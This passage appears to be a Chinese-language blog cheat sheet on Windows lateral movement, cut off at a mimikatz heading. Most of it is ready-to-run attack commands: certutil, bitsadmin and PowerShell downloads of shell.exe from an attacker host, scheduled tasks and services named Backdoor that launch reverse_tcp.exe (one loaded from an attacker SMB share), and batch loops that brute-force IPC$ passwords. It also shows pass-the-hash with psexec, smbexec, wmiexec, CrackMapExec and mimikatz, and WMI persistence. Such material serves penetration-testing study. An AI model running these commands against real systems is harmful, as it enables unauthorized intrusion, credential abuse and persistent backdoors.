class="built_in">del</span>                 # 删除admin$共享</span><br><span class="line"><span class="built_in">net</span> share c$ /<span class="built_in">del</span>                     # 删除C盘共享</span><br><span class="line"><span class="built_in">net</span> use * /<span class="built_in">del</span>                        # 删除所有连接</span><br><span class="line"></span><br><span class="line"># IPC$ 连接建立之后的操作</span><br><span class="line"><span class="built_in">dir</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span>\c$                # 列出目标文件目录</span><br><span class="line"># 将文件复制到目标C盘aaa目录下</span><br><span class="line"><span class="built_in">copy</span> C:\\Users\Administrator\Desktop\whatever.exe \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span>\c$\aaa</span><br><span class="line"><span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span>\c$\<span class="number">1</span>.txt         # 查看目标C盘下<span class="number">1</span>.txt文件内容</span><br><span class="line"><span class="built_in">net</span> use h: \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">138</span>\c$        # 磁盘映射，将目标的 C 盘映射到本地的 H 盘</span><br><span class="line"><span class="built_in">net</span> use h: /<span class="built_in">del</span>                       # 删除磁盘映射</span><br></pre></td></tr></table></figure>

<blockquote>
<p>常见IPC错误代码</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限 </span><br><span class="line">51：网络问题，Windows 无法找到网络路径</span><br><span class="line">53：找不到网络路径，可能是<span class="built_in"> IP </span>地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题</span><br><span class="line">67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$</span><br><span class="line">1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除</span><br><span class="line">1326：账号密码错误</span><br><span class="line">1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况</span><br><span class="line">2242：用户密码过期，目标有账号策略，强制定期更改密码</span><br></pre></td></tr></table></figure>



<h3 id="Windows自带下载工具"><a href="#Windows自带下载工具" class="headerlink" title="Windows自带下载工具"></a>Windows自带下载工具</h3><blockquote>
<p>certutil</p>
<p>Certutil 是Windows自带的命令行工具，用于管理Windows证书并作为证书服务器的一部分安装。Certutil提供了从网络下载文件的功能</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 从<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>:<span class="number">8000</span>下载shell.exe到本地c:\users\public\目录下</span><br><span class="line">certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>:<span class="number">8000</span>/shell.exe c:\users\public\shell.exe </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># </span><br><span class="line">(New-Object <span class="built_in">Net</span>.WebClient).DownloadFile(&quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>:<span class="number">8000</span>/shell.exe&quot;, &quot;c:\users\public\shell.exe&quot;) </span><br><span class="line"></span><br><span class="line">powershell -c &quot;(New-Object <span class="built_in">Net</span>.WebClient).DownloadFile(&#x27;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>:<span class="number">8000</span>/shell.exe&#x27;,&#x27;c:\users\public\shell.exe&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>bitsadmin</p>
<p>BITSAdmin用于创建、下载和上传作业，监视其进度。Windows7及以后的系统自带BitsAdmin工具。</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个名为test的bitsadmin任务，从<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>下载<span class="number">1</span>.txt,保存为c:\a.txt</span><br><span class="line">bitsadmin /transfer test http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>/<span class="number">1</span>.txt c:\a.txt </span><br></pre></td></tr></table></figure>

<blockquote>
<p>powershell</p>
<p>通过创建WebClient对象来实现文件下载</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadFile(<span class="string">&quot;http://192.168.1.1/1.txt&quot;</span>, <span class="string">&quot;c:\a.txt&quot;</span>) </span><br><span class="line"></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;(New-Object Net.WebClient).DownloadFile(&#x27;http://192.168.1.1/1.txt&#x27;,&#x27;c:\a.txt&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="at-amp-schtasks-amp-sc横向"><a href="#at-amp-schtasks-amp-sc横向" class="headerlink" title="at&amp; schtasks &amp; sc横向"></a>at&amp; schtasks &amp; sc横向</h2><blockquote>
<p>前提条件:</p>
</blockquote>
<ul>
<li>目标机器开启且没有禁用<code>IPC$</code>连接</li>
<li>远程主机的139端口和445端口开放</li>
<li>目标机器的管理员权限的账号密码</li>
<li>注意：Windows Server 2012 以后的版本没有<code>at</code>命令，只有<code>schtasks</code>命令</li>
</ul>
<blockquote>
<p>at (计划任务)</p>
<p>1、建立 IPC 链接到目标主机；2、拷贝要执行的命令脚本到目标主机；3、 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本；4、删除 IPC 链接；</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 先建立非空连接</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span>\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;</span><br><span class="line"># 查看时间</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span></span><br><span class="line"># 结果输出到 result 下</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span> <span class="number">10</span>:<span class="number">30</span> <span class="built_in">cmd</span>.exe /c &quot;whoami &gt; c:\result.txt&quot;</span><br><span class="line"># 查看执行结果</span><br><span class="line"><span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span>\c$\result.txt</span><br><span class="line"># 删除计划任务，<span class="number">1</span>是任务号</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span> <span class="number">1</span> /delete</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 先建立非空连接</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span>\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;   # 建立非空连接</span><br><span class="line"># 上传 bat 脚本</span><br><span class="line"><span class="built_in">copy</span> hack.bat \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span>\c$\Windows\Temp</span><br><span class="line"># 查看时间</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span>                                                       </span><br><span class="line"># 创建定时任务，执行木马脚本</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span> <span class="number">19</span>:<span class="number">48</span> c:\Windows\Temp\hack.bat</span><br><span class="line"># 查看任务列表</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span>                                                             </span><br></pre></td></tr></table></figure>

<blockquote>
<p>schtasks</p>
<ol>
<li>利用已建立的IPC连接上传后门程序</li>
<li>利用已建立的IPC连接或指定用户凭据的方式在远程主机上创建计划任务shell</li>
<li>使用schtasks命令时，会在系统中留下日志文件C:\Windows\Tasks\SchedLgU.txt。</li>
</ol>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># /S 指定要连接的系统； /TN 指定计划任务的名称； /SC 指定计划任务执行频率； </span><br><span class="line"># /MO 指定计划任务执行周期； /TR 指定计划任务执行程序； /RU 指定计划任务运行的用户权限 </span><br><span class="line"># /F  如果指定的任务已存在，则强制创建</span><br><span class="line">schtasks /Create /S <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span> /TN Backdoor /SC minute /MO <span class="number">1</span> /TR C:\users\pubilc\reverse_tcp.exe /RN System /F</span><br><span class="line"></span><br><span class="line"># 如果没有建立IPC连接，则需要指定远程主机的用户凭据</span><br><span class="line">schtasks /Create /S <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span> /TN Backdoor /SC minute /MO <span class="number">1</span> /TR C:\users\pubilc\reverse_tcp.exe /RN System /F /U Administrator /P <span class="number">123</span>qwe@</span><br><span class="line"></span><br><span class="line"># 创建完成后，可以等待计划任务自行执行，也可以立即启动计划任务shell</span><br><span class="line">schtasks /RUN /S <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span> /I /TN Backdoor</span><br><span class="line"></span><br><span class="line"># 查看计划任务shell</span><br><span class="line">schtasks /query /S <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span> /TN Backdoor</span><br><span class="line"></span><br><span class="line"># 删除计划任务shell</span><br><span class="line">schtasks /Delete /S <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span> /TN Backdoor /F</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>UNC路径加载执行</p>
<p>以直接使用UNC路径代替常规的本地路径，让目标主机直接在测试人员搭建的Smb共享中加载攻击载荷并执行。这样可以省去手动上传载荷的步骤。</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 192.168.1.131 /TN Backdoor /SC minute /MO 1 /TR \\192.168.1.1\mysmb\reverse_tcp.exe /RN<span class="built_in"> System </span>/F</span><br></pre></td></tr></table></figure>

<blockquote>
<p>sc (系统服务)</p>
<p>创建远程服务需要拥有<strong>两端主机的管理员权限（要创建服务）</strong>和IPC连接，具体操作：</p>
<ol>
<li>利用已建立的共享连接向远程主机上传攻击载荷a.exe</li>
<li>利用已建立的IPC连接在远程主机上创建系统服务shell</li>
</ol>
</blockquote>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 先建立非空连接</span><br><span class="line">net use \\<span class="number">192.168</span><span class="number">.1</span><span class="number">.131</span>\ipc$ <span class="string">&quot;password&quot;</span> /user:<span class="string">&quot;Administrator&quot;</span></span><br><span class="line"></span><br><span class="line"># 拷贝文件</span><br><span class="line">copy C:\a.exe \\<span class="number">192.168</span><span class="number">.1</span><span class="number">.131</span>\c$\users\a.exe</span><br><span class="line"></span><br><span class="line"># 在<span class="number">192.168</span><span class="number">.1</span><span class="number">.131</span>上创建一个名为Backdoor的命令</span><br><span class="line">sc \\<span class="number">192.168</span><span class="number">.1</span><span class="number">.131</span> create Backdoor binpath= <span class="string">&quot;cmd.exe /k c:\users\a.exe&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>批量爆破脚本</p>
<p>通过爆破获取IPC$连接</p>
</blockquote>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#批量检测 IP 对应明文连接</span></span><br><span class="line">FOR /F %%i <span class="keyword">in</span> (ips.txt) <span class="keyword">do</span> net <span class="keyword">use</span> \\%%i\ipc<span class="variable">$ </span><span class="string">&quot;admin!@#45&quot;</span> /<span class="symbol">user:</span>administrator</span><br><span class="line"></span><br><span class="line"><span class="comment">#批量检测 IP 对应明文 回显版</span></span><br><span class="line">FOR /F %%i <span class="keyword">in</span> (ips.txt) <span class="keyword">do</span> atexec.exe ./<span class="symbol">administrator:</span>admin!@<span class="comment">#45@%%i whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#批量检测明文对应 IP 回显版</span></span><br><span class="line">FOR /F %%i <span class="keyword">in</span> (pass.txt) <span class="keyword">do</span> atexec.exe ./<span class="symbol">administrator:</span>%%i<span class="variable">@192</span>.<span class="number">168.1</span>.<span class="number">131</span> whoami</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量检测 HASH 对应 IP 回显版</span></span><br><span class="line">FOR /F %%i <span class="keyword">in</span> (hash.txt) <span class="keyword">do</span> atexec.exe -hashes <span class="symbol">:%%i</span> ./administrator<span class="variable">@192</span>.<span class="number">168.1</span>.<span class="number">131</span> whoami</span><br></pre></td></tr></table></figure>

<h2 id="SMB协议"><a href="#SMB协议" class="headerlink" title="SMB协议"></a>SMB协议</h2><blockquote>
<p>前提条件</p>
</blockquote>
<ul>
<li>目标主机开启了 <code>admin$</code>共享</li>
<li>目标主机未开启防火墙或者放行了445端口</li>
<li>如果是工作组环境，则必须使用administrator用户连接</li>
<li>如果是域环境，连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。</li>
<li>目标主机的账号密码 </li>
</ul>
<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec">psexec</a></p>
</blockquote>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># -accepteula 禁止弹出许可证对话框； -s 以SYSTEM权限启动进程；</span><br><span class="line">PsExec64.exe -accepteula \\<span class="number">192.168</span><span class="number">.10</span><span class="number">.3</span> -u administrator -p &lt;password&gt; -s cmd.exe</span><br><span class="line"></span><br><span class="line"># 或者先建立IPC连接$</span><br><span class="line">net use \\<span class="number">192.168</span><span class="number">.10</span><span class="number">.3</span>\ipc$ &lt;password&gt; /user:administrator</span><br><span class="line">PsExec64.exe -accepteula \\<span class="number">192.168</span><span class="number">.10</span><span class="number">.3</span> cmd.exe /c <span class="string">&quot;ipconfig&quot;</span></span><br><span class="line"></span><br><span class="line"># 建立IPC连接以后也可以直接执行命令</span><br><span class="line">PsExec64.exe -accepteula \\<span class="number">192.168</span><span class="number">.10</span><span class="number">.3</span> ipconfig</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/smbexec.py">smbexec.py</a>、<a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows/blob/master/smbexec.exe">smbexec.exe</a></p>
<p><strong>无需先 ipc 链接</strong>， 明文或 hash 传递（第三方库）</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbexec <span class="tag">&lt;<span class="name">Domain</span> <span class="attr">Name</span>&gt;</span>/<span class="tag">&lt;<span class="name">UserName</span>&gt;</span>:<span class="tag">&lt;<span class="name">Password</span>&gt;</span>@<span class="tag">&lt;<span class="name">IP</span>&gt;</span></span><br><span class="line"></span><br><span class="line">smbexec -hashes :<span class="tag">&lt;<span class="name">NTHash</span>&gt;</span> [Domain/]<span class="tag">&lt;<span class="name">UserName</span>&gt;</span>@<span class="tag">&lt;<span class="name">IP</span>&gt;</span> [Command]</span><br></pre></td></tr></table></figure>

<h3 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/smbclient.py">smbclient.py</a>、<a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows/blob/master/smbclient.exe">smbclient.exe</a></p>
<p>支持SMB1, SMB2 (2.1),  SMB signing</p>
<p>功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -hashes 00000000000000000000000000000000:<span class="tag">&lt;<span class="name">NTML</span> <span class="attr">Hash</span>&gt;</span> <span class="tag">&lt;<span class="name">Domain</span> <span class="attr">Name</span>&gt;</span>/<span class="tag">&lt;<span class="name">UserName</span>&gt;</span>@<span class="tag">&lt;<span class="name">IP</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 账号密码</span></span><br><span class="line">crackmapexec<span class="built_in"> smb </span>192.168.216.144 -u <span class="string">&#x27;administrator&#x27;</span> -p <span class="string">&#x27;pass1234!&#x27;</span> -x <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"><span class="comment"># NTML Hash</span></span><br><span class="line">crackmapexec<span class="built_in"> smb </span>192.168.216.144 -u <span class="string">&#x27;administrator&#x27;</span> -H <span class="string">&#x27;ff1a0a31d936bc8bf8b1ffc5b244b356&#x27;</span> -x <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/ParrotSec/mimikatz">mimikatz</a></p>
</blockquote>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:&lt;UserName&gt; /domain:&lt;DomainName&gt; /ntlm:&lt;NTML Hash&gt;&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><blockquote>
<p>利用<code>WMI</code>可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。</p>
</blockquote>
<blockquote>
<p>前提条件</p>
</blockquote>
<blockquote>
<p>目标主机开放了135,445端口</p>
<p>目标主机关闭防火墙</p>
</blockquote>
<h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><blockquote>
<p>明文传递密码，无回显</p>
<p>wmiexec就是对WMIC利用的强化</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:&lt;IP&gt; /user:&lt;UserName&gt; /password:&lt;Password&gt; process call create <span class="string">&quot;Command&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 回显的话可以先建立IPC$非空连接再查看</span></span><br><span class="line">net use \\192.168.1.8\ipc$ <span class="string">&quot;password&quot;</span> /user:administrator</span><br><span class="line">type \\192.168.1.8\c$\ip.txt</span><br><span class="line">net use \\192.168.1.8 /del</span><br></pre></td></tr></table></figure>

<h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a>、<a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">wmiexec.exe<em>推荐</em></a>、<a target="_blank" rel="noopener" href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">wmiexec.vbs</a></p>
<p>需要调用wmi服务，占用目标的445、135和另一个随机端口。</p>
</blockquote>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 得到用户密码的情况下</span></span><br><span class="line">wmiexec <span class="params">&lt;DomainName&gt;</span>/<span class="params">&lt;UserName&gt;</span>:<span class="params">&lt;Password&gt;</span>@<span class="params">&lt;IP&gt;</span> <span class="string">&quot;Command&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 得到NTMLHash的情况下</span></span><br><span class="line">wmiexec -hashes <span class="number">00000000000000000000000000000000</span>:<span class="params">&lt;NTHash&gt;</span> <span class="params">&lt;UserName&gt;</span>@<span class="params">&lt;IP&gt;</span> [Command]</span><br><span class="line"></span><br><span class="line"><span class="meta"># wmiexec.vbs需要使用中自带的cscript加载wmiexec.vbs</span></span><br><span class="line">cscript wmiexec.vbs /cmd <span class="params">&lt;IP&gt;</span> <span class="params">&lt;UserName&gt;</span> <span class="params">&lt;Password&gt;</span> <span class="string">&quot;Command&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="sharpwmi"><a href="#sharpwmi" class="headerlink" title="sharpwmi"></a>sharpwmi</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/sharpwmi">sharpwmi</a></p>
<p>只依赖<code>135</code>端口，不依赖<code>139</code>和<code>445</code>端口</p>
<p>只支持上传512kb以下的文件</p>
<p>执行命令和上传文件都依赖powershell(会被杀软拦截)，需要账号密码</p>
</blockquote>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 明文密码执行命令</span></span><br><span class="line">sharpwmi.exe <span class="params">&lt;IP&gt;</span> <span class="params">&lt;UserName&gt;</span> <span class="params">&lt;Password&gt;</span> cmd <span class="string">&quot;Command&quot;</span></span><br><span class="line"><span class="meta"># 明文密码上传文件</span></span><br><span class="line">sharpwmi.exe <span class="params">&lt;IP&gt;</span> <span class="params">&lt;UserName&gt;</span> <span class="params">&lt;Password&gt;</span> upload <span class="params">&lt;filename&gt;</span> <span class="params">&lt;OutFilePath&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Sharp-WMIEvent"><a href="#Sharp-WMIEvent" class="headerlink" title="Sharp-WMIEvent"></a>Sharp-WMIEvent</h3><blockquote>
<p>[Sharp-WMIEvent</p>
<p>WMI事件订阅实现内网横向移动和权限持久化</p>
</blockquote>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 在远程主机上部署一个随即命名的永久事件订阅，并每隔60s执行以此SMB共享中的攻击载荷</span></span><br><span class="line">Sharp-WMIEvent -Trigger Interval -IntervalPeriod <span class="number">60</span> -ComputerName <span class="params">&lt;IP&gt;</span> -Domain <span class="params">&lt;DomainName&gt;</span> -Username <span class="params">&lt;UserName&gt;</span> -Password <span class="params">&lt;Password&gt;</span> -Command <span class="string">&quot;Command&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="wmihacker"><a href="#wmihacker" class="headerlink" title="wmihacker"></a>wmihacker</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/rootclay/WMIHACKER">wmihacker</a></p>
<p>无需445端口，Win2003机器以后全部版本</p>
<p>命令执行、文件上传、文件下载、PTH使用</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令回显执行命令</span></span><br><span class="line"><span class="attribute">cscript</span> WMIHACKER.vbs /cmd &lt;IP&gt; &lt;UserName&gt; &lt;Password&gt; <span class="string">&quot;Command&quot;</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 无命令回显执行命命令</span></span><br><span class="line"><span class="attribute">cscript</span> WMIHACKER.vbs /cmd &lt;IP&gt; &lt;UserName&gt; &lt;Password&gt; <span class="string">&quot;Command&quot;</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟Shell模式</span></span><br><span class="line"><span class="attribute">cscript</span> WMIHACKER_<span class="number">0</span>.<span class="number">6</span>.vbs /shell <span class="number">172.16.94.187</span> administrator <span class="string">&quot;Password!&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件上传</span></span><br><span class="line"><span class="attribute">cscript</span> wmihacker_<span class="number">0</span>.<span class="number">4</span>.vbe /upload <span class="number">172.16.94.187</span> administrator <span class="string">&quot;Password!&quot;</span> <span class="string">&quot;c:\windows\system32\calc.exe&quot;</span> <span class="string">&quot;c:\calc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件下载</span></span><br><span class="line"><span class="attribute">cscript</span> wmihacker_<span class="number">0</span>.<span class="number">4</span>.vbe /download <span class="number">172.16.94.187</span> administrator <span class="string">&quot;Password!&quot;</span> <span class="string">&quot;c:\calc&quot;</span> <span class="string">&quot;c:\windows\system32\calc.exe&quot;</span> </span><br></pre></td></tr></table></figure>

<h3 id="Wmiexec-Pro"><a href="#Wmiexec-Pro" class="headerlink" title="Wmiexec-Pro"></a>Wmiexec-Pro</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/XiaoliChan/wmiexec-Pro">Wmiexec-Pro</a></p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 命令执行、文件传输、开关RDP、开关WinRM、防火墙、修改服务、系统日志、RID劫持</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/XiaoliChan/</span>wmiexec-Pro</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Powershell-Invoke-TheHash"><a href="#Powershell-Invoke-TheHash" class="headerlink" title="Powershell:Invoke-TheHash"></a>Powershell:Invoke-TheHash</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Invoke-TheHash">Powershell:Invoke-TheHash</a></p>
</blockquote>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -hash &lt;NTML&gt; -Target <span class="number">172.16</span><span class="number">.33</span><span class="number">.9</span> -domain . -Username administrator -command calc -Verbose</span><br></pre></td></tr></table></figure>

<h3 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></p>
</blockquote>
